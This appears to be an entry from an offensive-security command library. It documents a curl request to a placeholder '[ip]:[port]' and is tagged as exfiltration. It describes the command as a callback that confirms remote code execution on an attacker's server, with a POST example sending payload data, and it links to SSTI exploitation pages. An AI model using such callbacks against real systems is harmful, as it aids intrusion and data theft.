---
data: 'curl http://[ip]:[port]/'
tags:
  - http
  - exfiltration
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: bb54c857-a8a6-458a-b1b1-aefb525e7e88
created_at: '2025-12-11T06:10:15.474Z'
updated_at: '2025-12-11T06:10:15.474Z'
verified: false
validated: true
submitted: true
---
# curl-http-request

## Command

```bash
curl http://[ip]:[port]/
```

## Description

Makes an HTTP GET request to the specified URL, commonly used in RCE payloads to confirm execution by connecting to an attacker's server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | http://[ip]:[port]/ - the target URL to request | Yes |

## Examples

### Basic Usage

```bash
curl http://example.com/
```

### Advanced Usage

```bash
curl -X POST http://example.com/ -d 'data=payload'
```

## Expected Output

Response from the server at the specified IP and port, such as HTTP headers or body content.

## Related

- [[commands/node-ssti-rce-payload]]
- [[procedures/Exploit-SSTI-for-Remote-Code-Execution]]
